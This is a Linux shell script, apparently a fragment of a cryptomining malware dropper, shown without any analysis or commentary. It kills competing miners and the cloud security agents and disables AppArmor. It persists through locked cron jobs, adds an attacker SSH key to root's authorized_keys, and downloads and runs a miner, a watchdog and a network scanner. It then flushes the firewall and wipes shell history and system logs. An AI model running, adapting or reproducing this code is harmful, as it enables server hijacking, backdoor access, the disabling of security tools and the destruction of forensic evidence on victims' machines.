	rm -rf /tmp/2.sh
	rm /opt/atlassian/confluence/bin/1.sh
	rm /opt/atlassian/confluence/bin/1.sh.1
	rm /opt/atlassian/confluence/bin/1.sh.2
	rm /opt/atlassian/confluence/bin/1.sh.3
	rm /opt/atlassian/confluence/bin/3.sh
	rm /opt/atlassian/confluence/bin/3.sh.1
	rm /opt/atlassian/confluence/bin/3.sh.2
	rm /opt/atlassian/confluence/bin/3.sh.3
	rm -rf /var/tmp/f41
	rm -rf /var/tmp/2.sh
	rm -rf /var/tmp/config.json
	rm -rf /var/tmp/xmrig
	rm -rf /var/tmp/1.so
	rm -rf /var/tmp/kworkerds3
	rm -rf /var/tmp/kworkerdssx
	rm -rf /var/tmp/kworkerds
	rm -rf /var/tmp/wc.conf
	rm -rf /var/tmp/nadezhda.
	rm -rf /var/tmp/nadezhda.arm
	rm -rf /var/tmp/nadezhda.arm.1
	rm -rf /var/tmp/nadezhda.arm.2
	rm -rf /var/tmp/nadezhda.x86_64
	rm -rf /var/tmp/nadezhda.x86_64.1
	rm -rf /var/tmp/nadezhda.x86_64.2
	rm -rf /var/tmp/sustse3
	rm -rf /var/tmp/sustse
	rm -rf /var/tmp/moneroocean/
	rm -rf /var/tmp/devtool
	rm -rf /var/tmp/devtools
	rm -rf /var/tmp/play.sh
	rm -rf /var/tmp/systemctI
	rm -rf /var/tmp/.java
	rm -rf /var/tmp/1.sh
	rm -rf /var/tmp/conf.n
	rm -r /var/tmp/lib
	rm -r /var/tmp/.lib
	chattr -iau /tmp/lok
	chmod +700 /tmp/lok
	rm -rf /tmp/lok
	chattr -i /tmp/kdevtmpfsi
	echo 1 > /tmp/kdevtmpfsi
	chattr +i /tmp/kdevtmpfsi
	chattr -i /tmp/redis2
	echo 1 > /tmp/redis2
	chattr +i /tmp/redis2
	chattr -i /usr/lib/systemd/systemd-update-daily
	echo 1 > /usr/lib/systemd/systemd-update-daily
	chattr +i /usr/lib/systemd/systemd-update-daily
	sleep 1
	service apparmor stop
	systemctl disable apparmor
	service aliyun.service stop
	systemctl disable aliyun.service
	ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
	rm -rf /usr/local/aegis
	sleep 1
	chattr -R -i /var/spool/cron
	chattr -i /etc/crontab
    crontab -r
    rm -rf /var/spool/cron/*
	apt-get install -y unhide
	yum install -y unhide
	sleep 1
	dddir="/usr/sbin/unhide"
	$dddir quick |grep PID:|awk '{print $4}'|xargs -I % kill -9 % 2>/dev/null
	chattr -i /usr/bin/ip6network
	chattr -i /usr/bin/kswaped
	chattr -i /usr/bin/irqbalanced
	chattr -i /usr/bin/rctlcli
	chattr -i /usr/bin/systemd-network
	chattr -i /usr/bin/pamdicks
	echo 1 > /usr/bin/ip6network
	echo 2 > /usr/bin/kswaped
	echo 3 > /usr/bin/irqbalanced
	echo 4 > /usr/bin/rctlcli
	echo 5 > /usr/bin/systemd-network
	echo 6 > /usr/bin/pamdicks
	chattr +i /usr/bin/ip6network
	chattr +i /usr/bin/kswaped
	chattr +i /usr/bin/irqbalanced
	chattr +i /usr/bin/rctlcli
	chattr +i /usr/bin/systemd-network
	chattr +i /usr/bin/pamdicks
}
downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
	echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cur" ]
    then
        http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        else
            cur --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	then
		wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wge" ]
    then
        wge --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wge --timeout=10 --tries=100 -O $2 $3
        fi
    fi
}

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}

kill_miner_proc
kill_sus_proc

unlock_cron()
{
    chattr -R -i /var/spool/cron
    chattr -i /etc/crontab
}

lock_cron()
{
    chattr -R +i /var/spool/cron
    chattr +i /etc/crontab
}

if [ -f "$rtdir" ]
then
        echo "i am root"
        echo "goto 1" >> /etc/sysupdates
        chattr -i /etc/sysupdate*
        chattr -i /etc/config.json*
        chattr -i /etc/update.sh*
        chattr -i /root/.ssh/authorized_keys*
	    chattr -i /etc/networkservice
	if [ ! -f "/usr/bin/crontab" ]
		then 
			unlock_cron
			echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1" >> ${crondir}
			lock_cron
		else
			unlock_cron
			[[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1") | crontab -
			lock_cron
	fi
        chmod 700 /root/.ssh/
        echo >> /root/.ssh/authorized_keys
        chmod 600 root/.ssh/authorized_keys
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" >> /root/.ssh/authorized_keys
        
	
        cfg="/etc/config.json"
        file="/etc/sysupdate"

	if [-f "/etc/config.json" ]
	then
		filesize_config=`ls -l /etc/config.json | awk '{ print $5 }'`
		if [ "$filesize_config" -ne "$config_size" ]	
		then
            pkill -f sysupdate
			rm /etc/config.json
            downloads $config_url /etc/config.json $config_url_backup
		else
			echo "no need download"
		fi
	else
		downloads $config_url /etc/config.json $config_url_backup
    fi
    
    if [ -f "/etc/sysupdate" ]
    then
            filesize1=`ls -l /etc/sysupdate | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$miner_size" ] 
            then
                pkill -f sysupdate
                rm /etc/sysupdate
                downloads $miner_url /etc/sysupdate $miner_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $miner_url /etc/sysupdate $miner_url_backup
    fi
    
    if [ -f "/etc/sysguard" ]
    then
            filesize1=`ls -l /etc/sysguard | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$watchdog_size" ] 
            then
                pkill -f sysguard
                rm /etc/sysguard
                downloads $watchdog_url /etc/sysguard $watchdog_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $watchdog_url /etc/sysguard $watchdog_url_backup
    fi

    downloads $sh_url /etc/update.sh $sh_url_backup

    if [ -f "/etc/networkservice" ]
    then
            filesize2=`ls -l /etc/networkservice | awk '{ print $5 }'`
            if [ "$filesize2" -ne "$scan_size" ] 
            then
                pkill -f networkservice
                rm /etc/networkservice
                downloads  $scan_url /etc/networkservice $scan_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $scan_url /etc/networkservice $scan_url_backup
    fi

    chmod 777 /etc/sysupdate
    ps -fe|grep sysupdate |grep -v grep
    if [ $? -ne 0 ]
    then
                cd /etc
                echo "not root runing"
                sleep 5s
                ./sysupdate &
    else
                echo "root runing....."
    fi
	chmod 777 /etc/networkservice
    ps -fe|grep networkservice |grep -v grep
    if [ $? -ne 0 ]
    then
                cd /etc
                echo "not roots runing"
                sleep 5s
                nice ./networkservice 15 &
    else
                echo "roots runing....."
    fi
    chmod 777 /etc/sysguard
    ps -fe|grep sysguard |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /etc
                chmod 777 sysguard
                sleep 5s
                ./sysguard &
            else
                echo "roots runing....."
        fi


    chmod 777 /etc/sysupdate
    chattr +i /etc/sysupdate
	chmod 777 /etc/networkservice
	chattr +i /etc/networkservice
    chmod 777 /etc/config.json
    chattr +i /etc/config.json
    chmod 777 /etc/update.sh
    chattr +i /etc/update.sh
    chmod 777 /root/.ssh/authorized_keys
    chattr +i /root/.ssh/authorized_keys
else
    echo "goto 1" > /tmp/sysupdates
    chattr -i /tmp/sysupdate*
	chattr -i /tmp/networkservice
    chattr -i /tmp/config.json*
    chattr -i /tmp/update.sh*
        
    if [ ! -f "/usr/bin/crontab" ]
	then 
			unlock_cron
			echo "*/30 * * * * sh /tmp/update.sh >/dev/null 2>&1" >> ${crondir}
			lock_cron
	else
			unlock_cron
			[[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /tmp/update.sh >/dev/null 2>&1") | crontab -
			lock_cron
	fi

	if [ -f "/tmp/config.json" ]
	then
		filesize1=`ls -l /tmp/config.json | awk '{ print $5 }'`
		if [ "$filesize1" -ne "$config_size" ]
		then
            pkill -f sysupdate
			rm /tmp/config.json
            downloads  $config_url /tmp/config.json $config_url_backup
		else
			echo "no need download"
		fi
	else
		downloads $config_url /tmp/config.json $config_url_backup
	fi

    if [ -f "/tmp/sysupdate" ]
    then    
        filesize1=`ls -l /tmp/sysupdate | awk '{ print $5 }'`
        if [ "$filesize1" -ne "$miner_size" ] 
        then
                pkill -f sysupdate
                rm /tmp/sysupdate
                downloads $miner_url /tmp/sysupdate $miner_url_backup
        else
                echo "no need download"
        fi
    else
            downloads $miner_url /tmp/sysupdate $miner_url_backup
    fi

    if [ -f "/tmp/sysguard" ]
    then
            filesize1=`ls -l /tmp/sysguard | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$watchdog_size" ] 
            then
                pkill -f sysguard
                rm /tmp/sysguard
                downloads $watchdog_url /tmp/sysguard $watchdog_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $watchdog_url /tmp/sysguard $watchdog_url_backup
    fi

    echo "i am here"
    downloads $sh_url /tmp/update.sh $sh_url_backup

    if [ -f "/tmp/networkservice" ]
    then 
        filesize2=`ls -l /tmp/networkservice | awk '{ print $5 }'`
        if [ "$filesize2" -ne "$scan_size" ]  
        then
                pkill -f networkservice
	            rm /tmp/networkservice
                downloads $scan_url /tmp/networkservice $scan_url_backup
        else
                echo "no need download"
        fi
    else
            downloads $scan_url /tmp/networkservice $scan_url_backup
    fi

    ps -fe|grep sysupdate |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmp runing"
                cd /tmp
                chmod 777 sysupdate
                sleep 5s
                ./sysupdate &
            else
                echo "tmp runing....."
        fi
	ps -fe|grep networkservice |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /tmp
                chmod 777 networkservice
                sleep 5s
                nice ./networkservice 15 &
            else
                echo "tmps runing....."
        fi

    ps -fe|grep sysguard |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /tmp
                chmod 777 sysguard
                sleep 5s
                ./sysguard &
            else
                echo "tmps runing....."
        fi

    chmod 777 /tmp/sysupdate
    chattr +i /tmp/sysupdate
	chmod 777 /tmp/networkservice
	chattr +i /tmp/networkservice
	chmod 777 /tmp/sysguard
	chattr +i /tmp/sysguard
    chmod 777 /tmp/update.sh
    chattr +i /tmp/update.sh
    chmod 777 /tmp/config.json
    chattr +i /tmp/config.json
        
fi
iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -I INPUT -s 43.245.222.57 -j DROP
service iptables reload
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
